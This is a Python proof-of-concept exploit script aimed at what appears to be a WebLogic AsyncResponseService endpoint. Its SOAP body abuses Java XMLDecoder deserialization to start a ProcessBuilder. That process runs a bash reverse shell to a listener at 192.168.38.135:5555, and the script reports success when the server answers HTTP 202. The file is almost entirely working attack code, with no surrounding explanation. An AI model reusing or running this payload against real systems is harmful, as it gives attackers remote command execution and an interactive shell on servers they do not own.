# -*- coding:utf-8 -*-
import requests

def poc(url):
    url =str(url).strip()+'/_async/AsyncResponseService'
    headers = {
        'Cache-Control':'max-age=0',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Content-Type':'text/xml',
        'Connection':'close'
    }
    payload = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">  
    <soapenv:Header> 
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>/bin/bash</string>
    </void>
    <void index="1">
    <string>-c</string>
    </void>
    <void index="2">
    <string>bash -i &gt;&amp; /dev/tcp/192.168.38.135/5555 0&gt;&amp;1</string>
    </void>
    </array>
    <void method="start"/></void>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body>
    <asy:onAsyncDelivery/>
    </soapenv:Body></soapenv:Envelope>
    '''
    p = requests.post(url,data=payload,headers=headers)
    if p.status_code == 202:
        return True
    else:
        return False


if __name__ == '__main__':
    poc('http://192.168.38.136:7001')